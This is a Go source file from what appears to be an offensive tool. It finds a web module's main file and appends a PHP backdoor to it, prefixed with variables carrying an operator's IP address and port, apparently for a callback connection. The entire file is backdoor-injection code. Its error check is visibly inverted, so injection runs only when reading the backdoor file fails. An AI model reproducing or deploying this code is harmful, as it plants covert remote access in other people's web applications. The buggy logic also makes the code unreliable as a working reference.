package internals

import (
	"fmt"
	"strings"

	"data"
	"utils"
)

func addAddress(addr data.Address, file *string) {
	*file = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + ";" + *file
}

func findModuleName(path string) string {
	var pathSplitted []string = strings.Split(path, "/")
	return pathSplitted[len(pathSplitted) - 1]
}

func Inject(addr data.Address, path string) error {
	const backdoorPath string = "../backdoor.php"
	var mainFilePath string
	var moduleName string = findModuleName(path)

	mainFile, err := findMainFileDirectory(path, moduleName)
	if err != nil {
		return err
	}

	mainFilePath = path + "/" + mainFile
	return injectBackDoor(addr, mainFilePath, backdoorPath)
}

func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
	backdoor, err := utils.ReadFile(backdoorPath)
	if err != nil {
		addAddress(addr, &backdoor)
		err = utils.AppendToFile(backdoor, filePath)
	}

	return err
}